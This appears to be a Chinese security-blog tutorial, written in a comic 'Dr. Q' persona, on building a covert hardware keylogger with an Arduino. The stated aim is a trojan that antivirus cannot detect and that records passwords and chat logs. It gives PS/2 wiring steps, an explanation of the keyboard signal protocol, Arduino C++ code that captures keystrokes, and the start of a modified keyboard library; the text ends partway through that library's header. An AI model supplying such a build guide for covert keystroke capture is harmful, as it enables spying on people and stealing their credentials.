<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong><span id="_baidu_bookmark_start_8" style="display: none; line-height: 0px;">‍</span></strong></span><span id="_baidu_bookmark_start_10" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38);"><strong><span style="font-size: 18px;">0×01&nbsp;永远跟不上的大牛脚步</span></strong></span><span id="_baidu_bookmark_end_11" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong><span id="_baidu_bookmark_end_9" style="display: none; line-height: 0px;">‍</span></strong></span></p>
<p><span style="color: rgb(38, 38, 38);"><strong><span id="_baidu_bookmark_start_30" style="display: none; line-height: 0px;">‍</span></strong></span><span id="_baidu_bookmark_start_32" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(255, 0, 0);"><strong>我是总部的Q博士，因为刘尼玛的木马程序被全部查杀，所以他需要一个永远不可能被杀毒软件查到的木马，这个任务自然又落到了我的身上。</strong></span></p>
<p><span id="_baidu_bookmark_start_42" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_44" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_46" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_48" style="display: none; line-height: 0px;">‍</span>刘尼玛碰到的难题并不让我感到意外，杀毒技术的进步使得木马的寿命越来越短了，但是有一群大牛在一直引领着技术革新的潮流，他们总有办法躲过杀毒软件的追杀.</p>
<p>当还是小菜的我好不容易用vb写出第一个木马，加载到注册表开机启动时，大牛嗤之以鼻，他说现在我们都玩进程注入了，这个早过时了；<br/>当我好不容易鼓捣成功dll木马，准备庆贺的时候，大牛又给我泼了一盆冷水，他说现在是bootkit和rootkit的时代，传统的木马已经进历史的垃圾堆了；</p>
<p>当我狂啃下了一堆内核书籍，终于知道rootkit是怎么回事的时候，大牛用嘲笑加可怜的眼神看着我说，你又晚了一步，我们都玩硬件了…</p>
<p><span style="color: rgb(0, 0, 0);"><strong>好吧，晚了就晚了，再晚也得跟着走，否则会更落后，现在我们开始探究硬件木马的原理:</strong></span></p>
<p><strong><span style="color: rgb(0, 176, 80);"><span id="_baidu_bookmark_start_50" style="display: none; line-height: 0px;">‍</span></span></strong><span id="_baidu_bookmark_start_52" style="display: none; line-height: 0px;">‍</span><strong><span style="color: rgb(0, 176, 80);">硬件木马目前已经发展出了很多种，有截取显卡输出的视频信号并发射的，有植入摄像头悄悄记录的，最常见的是键盘记录器，将键盘偷偷接入键盘记录器，再将记录器插在主机上，就能记录从键盘上输入的数据，比如账号密码，聊天记录等等，而任何杀毒软件都不会检测到。</span></strong></p>
<p><span id="_baidu_bookmark_start_63" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_65" style="display: none; line-height: 0px;">‍</span>我们先从键盘的插口开始，我这里没有usb的键盘，所以只研究了ps2口，但usb口的与之类似. ps2口一共有6个针脚: clock时钟、GND接地、DATA数据和5V的供电，剩余的两个是没有使用的保留口，排列顺序如下图所示：<span id="_baidu_bookmark_end_66" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_64" style="display: none; line-height: 0px;">‍</span></p>
<p style="background: white; margin: 5px 0px; text-align: center; line-height: 18px;"><img data-original="http://image.3001.net/images/ue/96091423968838.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/></p>
<noscript><img src="http://image.3001.net/images/ue/96091423968838.png"/></p></noscript>
<p><span style="color: rgb(38, 38, 38);"><strong><span id="_baidu_bookmark_start_67" style="display: none; line-height: 0px;">‍</span></strong></span><span id="_baidu_bookmark_start_69" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38);"><strong>在计算机主机上的ps2是母口的，因此排列顺序与上图正好相反.&nbsp;这6根线中只有Data和Clock用于数据传输，这样看来键盘记录器的原理其实并不复杂,我们需要一块微控制器和一个存储器，微控制器从键盘的data针脚读取输入数据，存入存储器之后，再通过主机ps2插口上的data输出,如下图所示:</strong></span><span id="_baidu_bookmark_end_70" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38);"><strong><span id="_baidu_bookmark_end_68" style="display: none; line-height: 0px;">‍</span></strong></span></p>
<p style="background: white; margin: 5px 0px; text-align: center; line-height: 18px;"><img data-original="http://image.3001.net/images/ue/76851423968841.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/></p>
<noscript><img src="http://image.3001.net/images/ue/76851423968841.png"/></p></noscript>
<p><span id="_baidu_bookmark_start_9" style="display: none; line-height: 0px;">‍</span></p>
<p><span id="_baidu_bookmark_start_79" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_81" style="display: none; line-height: 0px;">‍</span>实际上对主机的输出并不一定仍然用ps2口，usb或者串口都可以.<br/>看完上图，也许有人会说这实现起来很难，可能需要用到电路板、电阻、电容等一系列元件和丰富的无线电知识，在很久以前这或许是事实，但现在我们有一个新玩意儿，可以让你在连焊接都不用的情况下就实现上面的设计，它就是arduino.<span id="_baidu_bookmark_end_82" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_80" style="display: none; line-height: 0px;">‍</span></p>
<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong><span id="_baidu_bookmark_start_11" style="display: none; line-height: 0px;">‍</span></strong></span><span id="_baidu_bookmark_start_13" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong><span id="_baidu_bookmark_start_95" style="display: none; line-height: 0px;">‍</span></strong></span><span id="_baidu_bookmark_start_97" style="display: none; line-height: 0px;">‍</span><span style="font-size: 18px;"><strong><span style="color: rgb(38, 38, 38);">0×02 什么是Arduino</span></strong></span><span id="_baidu_bookmark_end_98" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong><span id="_baidu_bookmark_end_96" style="display: none; line-height: 0px;">‍</span></strong></span></p>
<p><span style="color: rgb(38, 38, 38);"><strong><span id="_baidu_bookmark_start_83" style="display: none; line-height: 0px;">‍</span></strong></span><span id="_baidu_bookmark_start_85" style="display: none; line-height: 0px;">‍</span><strong><span style="color: rgb(38, 38, 38);">Arduino实际上就是一种开发板，将微控制器和必需的元件集成在一块电路板上，扩展出完善的接口和针脚，就可以接上各种各样的传感器，完成你心中的设计，你也可以把它理解成一种电子积木，因为它不需要焊接，也不需要高深的无线电知识，只需要编程基础和基本的电路知识即可。</span></strong></p>
<p><span id="_baidu_bookmark_start_117" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_119" style="display: none; line-height: 0px;">‍</span>Arduino 不需要知道各种硬件的底层知识，这些底层的调用都已经提前帮你实现好了，而且它使用的是c语言而不是汇编，配有一个官方的IDE和各种硬件的调用库，你只需要按照你自己的设计插接好各种硬件，就可以开始编写程序了，编写完之后烧写入微控制器（在arduino中这称为下载）,它们会自动开始运行。<span id="_baidu_bookmark_end_120" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_118" style="display: none; line-height: 0px;">‍</span></p>
<p><span id="_baidu_bookmark_end_10" style="display: none; line-height: 0px;">‍</span></p>
<p style="background: white; margin: 5px 0px; text-align: center; line-height: 18px;"><br/><img data-original="http://image.3001.net/images/ue/76221423968843.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/><span style="background: rgb(241, 241, 235);">&nbsp; &nbsp;&nbsp; &nbsp;</span>&nbsp;</p>
<noscript><img src="http://image.3001.net/images/ue/76221423968843.jpg"/><span style="background: rgb(241, 241, 235);">&nbsp; &nbsp;&nbsp; &nbsp;</span>&nbsp;</p></noscript>
<p><span id="_baidu_bookmark_start_121" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_123" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_125" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_127" style="display: none; line-height: 0px;">‍</span>Arduino本身是一种开源硬件，电路图是公开的，现在官方的和扩展出的各种arduino板子加起来已经有上百种，但其中最基本的仍然是UNO和它的升级版Leonardo，上图就是UNO和Leonardo，我们的设计是基于Leonardo的.<br/>Aduino的官方网站:http://www.arduino.cc,要进行下面的内容,请在此下载arduino的官方IDE并安装,在IDE安装目录的drivers子目录中,有烧写arduino所需要的usb转串口驱动,必须要先安装驱动才能开始编程.<br/>(有关arduino的其他具体细节请自行google，这里只做基本介绍)<span id="_baidu_bookmark_end_128" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_126" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_124" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_122" style="display: none; line-height: 0px;">‍</span></p>
<p style="margin-top: 15px;"><strong style="color: rgb(38, 38, 38); font-size: 18px;"><span id="_baidu_bookmark_start_129" style="display: none; line-height: 0px;">‍</span></strong><span id="_baidu_bookmark_start_131" style="display: none; line-height: 0px;">‍</span><span style="font-size: 18px;"><strong><span style="color: rgb(38, 38, 38);">0×03 连接硬件</span></strong></span><span id="_baidu_bookmark_end_132" style="display: none; line-height: 0px;">‍</span><strong style="color: rgb(38, 38, 38); font-size: 18px;"><span id="_baidu_bookmark_end_130" style="display: none; line-height: 0px;">‍</span></strong></p>
<p><span id="_baidu_bookmark_start_151" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_153" style="display: none; line-height: 0px;">‍</span>Arduino 的右边有一排针脚，从0到13，除了0和1被RX和TX占用之外，其余的都可以用来扩展各种硬件，我们先把PS2的键盘和arduino连起来：</p>
<p>首先准备四根杜邦线，为了避免混淆，我采用和前面原理图中一样的颜色，把红线从键盘PS2口的5V针脚接入板子上左侧的5V针脚，把两端的GND用黑线连接起来，黄线从Clock针脚接入板子上的3号针脚，棕黄色线从DATA针脚接入板子上的5号针脚（3号和5号并不是确定的，在后面我们编写的程序中定义几号针脚，这里就接几号）：<span id="_baidu_bookmark_end_154" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_152" style="display: none; line-height: 0px;">‍</span></p>
<p style="background: white; text-align: center; line-height: 26px; margin-bottom: 10px;"><img data-original="http://image.3001.net/images/ue/30771423968846.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/></p>
<noscript><img src="http://image.3001.net/images/ue/30771423968846.jpg"/></p></noscript>
<p style="background: white; margin: 5px 0px; text-align: center; line-height: 18px;"><img data-original="http://image.3001.net/images/ue/93301423968849.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/></p>
<noscript><img src="http://image.3001.net/images/ue/93301423968849.jpg"/></p></noscript>
<p><span id="_baidu_bookmark_start_155" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_157" style="display: none; line-height: 0px;">‍</span>然后将arduino的miniUSB输出连接到电脑上的USB口，在电脑上安装USB转串口驱动，打开arduino IDE，在设置中设定好串口号，开始编写程序。<span id="_baidu_bookmark_end_158" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_156" style="display: none; line-height: 0px;">‍</span></p>
<p style="background: white; text-align: center; line-height: 26px; margin-bottom: 10px;"><img data-original="http://image.3001.net/images/ue/45251423968851.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/></p>
<noscript><img src="http://image.3001.net/images/ue/45251423968851.png"/></p></noscript>
<p style="margin-top: 15px;"><strong style="color: rgb(38, 38, 38); font-size: 18px;"><span id="_baidu_bookmark_start_171" style="display: none; line-height: 0px;">‍</span></strong><span id="_baidu_bookmark_start_173" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong>0×04 键盘输入的原理<span id="_baidu_bookmark_end_174" style="display: none; line-height: 0px;">‍</span><strong style="color: rgb(38, 38, 38); font-size: 18px;"><span id="_baidu_bookmark_end_172" style="display: none; line-height: 0px;">‍</span></strong><strong style="color: rgb(38, 38, 38); font-size: 18px;"><span id="_baidu_bookmark_end_172" style="display: none; line-height: 0px;"></span></strong></strong></span></p>
<p style="line-height: 26px; margin-bottom: 10px; margin-top: 15px; background: white;"><span id="_baidu_bookmark_start_159" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_161" style="display: none; line-height: 0px;">‍</span>在编写程序之前，先要了解键盘和计算机之间是如何传输数据的。<span style="color: rgb(38, 38, 38);"><strong>通过前面的内容，我们已经知道键盘与计算机之间其实是通过四根线连接的，除去电源和接地，起作用的实际上是时钟和数据，它们同时向计算机发送电信号. 而要将数据发送给计算机，键盘会同时检查这两根线路，只有确认它们都处于高位时，键盘才会发送数据，只要其中有一根处于低位，键盘就会认为其他设备正在发送数据，从而继续等待。</strong></span></p>
<p>从键盘所发出的数据是一个11位的结构，如下图所示:<span id="_baidu_bookmark_end_162" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_160" style="display: none; line-height: 0px;">‍</span></p>
<p style="background: white; text-align: center; line-height: 26px; margin-bottom: 10px;"><img data-original="http://image.3001.net/images/ue/45781423968853.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/></p>
<noscript><img src="http://image.3001.net/images/ue/45781423968853.png"/></p></noscript>
<p><span style="color: rgb(38, 38, 38);"><strong><span id="_baidu_bookmark_start_193" style="display: none; line-height: 0px;">‍</span></strong></span><span id="_baidu_bookmark_start_195" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38);"><strong>起始位的值一直固定为0,后面有8个数据位,这就是每按下一个键所发送的数据了,在每当时钟脉冲下降时就会从最小显著位开始发送,直到最高显著位为止,按下不同的键,各个时钟脉冲下降的规律也会不同,时钟脉冲的校验值每当脉冲到达一次低位就与1进行一次左移运算,同时每当数据脉冲与时钟脉冲同时到达高位时，二者的校验值就进行一次按位或运算，最后循环运算的结果就是所发送给计算机的按键值。</strong></span></p>
<p>在数据位后面跟着的是一个奇偶校验位和一个停止位,停止位的值总是1,这两个值其实是可以忽略的。<br/>这里用一段示例的demo程序来说明<span id="_baidu_bookmark_end_196" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_194" style="display: none; line-height: 0px;">‍</span></p>
<pre class="prettyprint lang-html">1.&nbsp;&nbsp;/*
2.&nbsp;&nbsp;*&nbsp;ps2.h
3.&nbsp;&nbsp;*/
4.&nbsp;&nbsp;&nbsp;
5.&nbsp;&nbsp;#include&quot;Arduino.h&quot;
6.&nbsp;&nbsp;&nbsp;
7.&nbsp;&nbsp;class&nbsp;PS2
8.&nbsp;&nbsp;{
9.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public:
10.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PS2(intclk,&nbsp;int&nbsp;data);
11.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;char&nbsp;read(void);
12.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;private:
13.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int_ps2clk;
14.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int_ps2data;
15.};
16.&nbsp;
17./*
18.*&nbsp;ps2.cpp
19.*/
20.#include&quot;ps2.h&quot;
21.&nbsp;
22.PS2::PS2(int&nbsp;clk,&nbsp;intdata)&nbsp;//初始化,设置时钟和数据位的针脚
23.{
24.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_ps2clk&nbsp;=&nbsp;clk;
25.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_ps2data&nbsp;=&nbsp;data;
26.}
27.&nbsp;
28.unsigned&nbsp;charPS2::read(void)
29.{
30.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;char&nbsp;data&nbsp;=&nbsp;0×00;
31.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;char&nbsp;i;
32.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;char&nbsp;bit&nbsp;=&nbsp;0×01;
33.&nbsp;
34.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pinMode(_ps2clk,&nbsp;INPUT);
35.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;digitalWrite(_ps2clk,&nbsp;HIGH);&nbsp;
36.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pinMode(_ps2data,&nbsp;INPUT);
37.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;digitalWrite(_ps2data,&nbsp;HIGH);&nbsp;//以上把时钟和数据均设置为高位,开始接受输入
38.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delayMicroseconds(50);
39.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(digitalRead(_ps2clk)&nbsp;==HIGH)
40.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;
41.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delayMicroseconds(5);
42.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(digitalRead(_ps2clk)&nbsp;==LOW)&nbsp;//起始位的部分什么也不做,直接跳过
43.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;
44.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(i=0;&nbsp;i&nbsp;&lt;&nbsp;8;&nbsp;i++)&nbsp;//循环读取数据位
45.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
46.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(digitalRead(_ps2clk)&nbsp;==HIGH)
47.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;
48.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(digitalRead(_ps2data)==HIGH)&nbsp;&nbsp;//当时钟和数据线路均为高位时开始计算
49.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
50.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=data&nbsp;|&nbsp;bit;&nbsp;//两个值进行一次按位或运算
51.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
52.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(digitalRead(_ps2clk)&nbsp;==&nbsp;LOW)
53.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;
54.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bit&nbsp;=bit&nbsp;&lt;&lt;&nbsp;1;&nbsp;&nbsp;//时钟脉冲每到达一次低位就与1进行一次左移运算
55.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
56.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(digitalRead(_ps2clk)&nbsp;==HIGH)
57.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;
58.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(digitalRead(_ps2clk)&nbsp;==LOW)&nbsp;//跳过校验位
59.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;
60.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(digitalRead(_ps2clk)&nbsp;==HIGH)
61.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;
62.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(digitalRead(_ps2clk)&nbsp;==LOW)&nbsp;//跳过停止位
63.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;
64.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pinMode(_ps2clk,&nbsp;OUTPUT);
65.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;digitalWrite(_ps2clk,&nbsp;LOW);&nbsp;//全部读取完毕,将时钟设为低位
66.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;data;
67.}</pre>
<p style="background: white; line-height: 26px; margin-bottom: 10px;">在arduino IDE所在路径的libraries子目录下新建一个ps2文件夹,把以上两个源文件拷贝进去,然后打开IDE，它们就能以开发库的形式被调用。<br/>在IDE中新建一个程序文件</p>
<pre class="prettyprint lang-html">1.&nbsp;#include&lt;ps2.h&gt;
2.&nbsp;&nbsp;
3.&nbsp;PS2&nbsp;kbd(3,&nbsp;5);&nbsp;//设置针脚为我们前面插入板子的3号和5号
4.&nbsp;&nbsp;
5.&nbsp;void&nbsp;setup()
6.&nbsp;{
7.&nbsp;&nbsp;&nbsp;Serial.begin(9600);
8.&nbsp;&nbsp;&nbsp;kbd.read();
9.&nbsp;&nbsp;&nbsp;kbd.read();//进行两次测试
10.}
11.void&nbsp;loop()
12.{
13.&nbsp;&nbsp;unsignedcharcode;&nbsp;&nbsp;
14.&nbsp;&nbsp;for(;;)&nbsp;{&nbsp;
15.&nbsp;&nbsp;&nbsp;&nbsp;code&nbsp;=kbd.read();
16.&nbsp;&nbsp;&nbsp;Serial.println(code);//读取键盘输入并输出到串口显示
17.&nbsp;&nbsp;}
18.}</pre>
<p><span id="_baidu_bookmark_start_205" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_207" style="display: none; line-height: 0px;">‍</span>将以上代码编译并下载到arduino，然后打开一个串口调试器,按下键盘上的任一个键(功能键除外)，串口中都会有输出。<span id="_baidu_bookmark_end_208" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_206" style="display: none; line-height: 0px;">‍</span></p>
<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong><span id="_baidu_bookmark_start_209" style="display: none; line-height: 0px;">‍</span></strong></span><span id="_baidu_bookmark_start_211" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong>0×05 完整的实现</strong></span><span id="_baidu_bookmark_end_212" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong><span id="_baidu_bookmark_end_210" style="display: none; line-height: 0px;">‍</span></strong></span></p>
<p><span id="_baidu_bookmark_start_231" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_233" style="display: none; line-height: 0px;">‍</span>我们已经知道，键盘记录器通过三个步骤记录按键：截取输入-存入存储器-发送到计算机，我们已经知道了截取输入的原理，但其具体的实现要比上面这个demo程序复杂的多，所幸的是，我们有现成的开发库可以利用：<a href="http://www.pjrc.com/teensy/arduino_libraries/PS2Keyboard.zip" target="_blank" title="" data_ue_src="http://www.pjrc.com/teensy/arduino_libraries/PS2Keyboard.zip" textvalue="点我点我！！" style="color: rgb(0, 176, 240); text-decoration: underline;"><span style="color: rgb(0, 176, 240);"><strong>点我点我！！</strong></span></a></p>
<p>这是arduino官方所推荐的第三方ps2键盘库，实现了基本的数字、字母和各种符号的输入，截获的按键代码直接转换成每个键的ascii值，但缺点是支持的功能键很少，有些键按照其中的规则定义，会互相产生冲突，比如F1-F12键，就与从p到z的一组字母冲突，因为在键盘ascii码标准中它们的值是一样的，使用时需要增加额外的规则来判定，为此，我对这个库做了修改，实现了ctrl和字母的组合，alt和字母的组合，不冲突的F1-F12功能键，大小写切换以及原来库里面已经实现的翻页和上下等特殊键，由于该开发库基于GPL协议开源，那我修改后的版本也使用同样的协议开放源代码，代码如下,如果你懒得看代码,在本文的最后有下载地址,下载后直接放在libraries子目录里即可。<span id="_baidu_bookmark_end_234" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_232" style="display: none; line-height: 0px;">‍</span></p>
<pre class="prettyprint lang-html">/*
&nbsp;&nbsp;*&nbsp;&nbsp;PS2Keyboard.h
&nbsp;&nbsp;*&nbsp;&nbsp;Arduino&nbsp;PS2键盘支持库
&nbsp;&nbsp;*&nbsp;&nbsp;修改自http://www.pjrc.com/teensy/arduino_libraries/PS2Keyboard.zip
*&nbsp;修改者:b41k3r
*&nbsp;基于GPLv2开源
*/
#ifndef&nbsp;PS2Keyboard_h
#define&nbsp;PS2Keyboard_h
&nbsp;
#include&nbsp;&lt;avr/io.h&gt;
#include&lt;avr/interrupt.h&gt;
#include&lt;avr/pgmspace.h&gt;
#if&nbsp;defined(ARDUINO)&amp;&amp;&nbsp;ARDUINO&nbsp;&gt;=&nbsp;100
#include&quot;Arduino.h&quot;
#else
#include&quot;WProgram.h&quot;
#endif
#definePS2_TAB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9&nbsp;//这些定义完全按照这些键对应的ascii值
#definePS2_ENTER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;13
#definePS2_BACKSPACE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8
#definePS2_CAPS_LOCK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;20
#definePS2_SHIFT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;16
#definePS2_LINEFEED&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10
#definePS2_ESC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;27
#definePS2_INSERT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;45
#definePS2_DELETE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;127
#definePS2_HOME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;36
